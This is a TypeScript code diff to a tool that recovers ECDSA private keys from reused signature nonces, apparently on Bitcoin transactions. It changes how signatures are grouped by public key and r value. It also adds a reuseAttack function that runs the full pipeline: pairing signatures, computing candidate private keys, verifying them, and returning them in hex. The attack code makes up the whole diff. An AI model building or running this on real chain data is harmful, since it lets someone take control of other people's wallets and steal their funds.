@@ -33,17 +33,25 @@ export function reuseCandidates(a: SigPairRec, b: SigPairRec): bigint[] {
   return out;
 }
 
-/** Scan a group's records for duplicate r values and yield all reuse pairs. */
-export function findReusePairs(records: SigPairRec[]): Array<[SigPairRec, SigPairRec]> {
-  const byR = new Map<string, SigPairRec[]>();
+/** Scan a group's records for duplicate r values and yield all reuse pairs.
+ *  W3 fix: same r across DIFFERENT pubkeys is not nonce reuse — k recovery
+ *  requires the same d. Records carrying a pubkey are grouped by (pubkey, r);
+ *  records without one (e.g. P2PKH spend from an unknown key) keep global r
+ *  grouping and rely on the evidence gate to reject cross-key coincidences. */
+export interface ReuseRec extends SigPairRec {
+  pubkey?: string;
+}
+
+export function findReusePairs(records: ReuseRec[]): Array<[ReuseRec, ReuseRec]> {
+  const byKey = new Map<string, ReuseRec[]>();
   for (const rec of records) {
-    const key = rec.r.toString(16);
-    const list = byR.get(key);
+    const key = rec.pubkey ? `${rec.pubkey.toLowerCase()}|${rec.r.toString(16)}` : `|${rec.r.toString(16)}`;
+    const list = byKey.get(key);
     if (list) list.push(rec);
-    else byR.set(key, [rec]);
+    else byKey.set(key, [rec]);
   }
-  const pairs: Array<[SigPairRec, SigPairRec]> = [];
-  for (const list of byR.values()) {
+  const pairs: Array<[ReuseRec, ReuseRec]> = [];
+  for (const list of byKey.values()) {
     for (let i = 0; i < list.length; i++) {
       for (let j = i + 1; j < list.length; j++) {
         if (list[i].z !== list[j].z) pairs.push([list[i], list[j]]);
@@ -52,3 +60,25 @@ export function findReusePairs(records: SigPairRec[]): Array<[SigPairRec, SigPai
   }
   return pairs;
 }
+
+/**
+ * W1.5 wiring: full pipeline in one call — pairs → candidates → gate (§9).
+ * Never returns a key that did not pass d·G == Q and the second-impl check.
+ */
+export async function reuseAttack(
+  records: ReuseRec[],
+  gate: (dHex: string, qHex: string, expectedAddress?: string) => Promise<GateResultLike>,
+): Promise<Array<{ pair: [string, string]; dHex: string; gate: GateResultLike }>> {
+  const out: Array<{ pair: [string, string]; dHex: string; gate: GateResultLike }> = [];
+  for (const [a, b] of findReusePairs(records)) {
+    for (const d of reuseCandidates(a, b)) {
+      const dHex = d.toString(16).padStart(64, "0");
+      const qHex = a.pubkey ?? "";
+      const g = await gate(dHex, qHex);
+      out.push({ pair: [a.record_id, b.record_id], dHex, gate: g });
+    }
+  }
+  return out;
+}
+
+export type GateResultLike = { ok: boolean; reason?: string };
